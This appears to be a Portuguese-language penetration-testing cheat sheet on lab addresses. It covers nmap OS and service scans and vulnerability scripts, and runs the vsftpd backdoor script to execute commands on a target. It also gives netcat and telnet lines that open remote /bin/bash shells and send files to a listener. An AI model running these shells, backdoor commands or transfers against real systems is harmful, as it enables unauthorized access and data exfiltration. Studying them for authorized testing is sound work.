# Finger print
Windows exibe ip da máquina
```
ipconfig 
```

scripts do nmap
```
/usr/share/nmap/scripts
```

```
nmap -O IP = máquina identificada
nmap -sn IP | grep 192 | cut -d ' ' -f 5 > ips.txt = ips das máquinas
nmap -sV IP = serviços
nmap -A = serviços e sistema operacional
nmap --script-help http-dlink-backdoor.nse = scripts help do nmap
nmap --script ftp-vsftpd-backdoor.nse --script-args ftp-vsftpd-backdoor.nse.cmd="ls" 192.168.0.221 = comando ls dentro de uma máquina linux
nmap --script=smb-enum-shares.nse 192.168.0.221 = comando que exibe o compatilhamento dentro de uma máquina windows
nmap --script=ftp.anon.nse <IP> = verifica se servidor ftp é anônimo
```

# BAIXA SCRIPTS E EXECUTA NA PORTA 22
```
cd /usr/share/nmap/scripts/
git clone https://github.com/vulnersCom/nmap-vulners.git
git clone https://github.com/scipag/vulscan.git
nmap -sV 192.168.0.221 -p 22 --script nmap-vulners/vulners.nse,vulscan/vulscan.nse
```

# ATUALIZA SCRIPTS
```
cd /usr/share/nmap/scripts/vulscan/utilities/updater
chmod a+x updateFiles.sh
./updateFiles.sh
```

# USO DE SCRIPT
```
nmap -sV 192.168.0.221 -p21,22 --script vulscan/vulscan.nse --script-args vulscandb=exploitdb.csv
nmap -sV 192.168.0.221 -p21,22,80 --script vulscan/vulscan.nse --script-args vulscandb=cve.csv
```
 

# ACESSO REMOTO
```
nc -nlp 3000 -v # cria um server, que permite o acesso
nc 192.168.144 3000 -e /bin/bash # acessa server e permite o comando bash

nc -vnlp 3000 # num terminal, crie um server
nc -vnlp 2000 # num terminal, crie um server
telnet 192.168.144 3000 | /bin/bash | telnet 192.168.144 2000
```

```
nc -vnlp 3000 > file.txt # num terminal, crie um server e receba dados
nc 192.168.144 3000 < file.txt # acessa server e envia dados
```
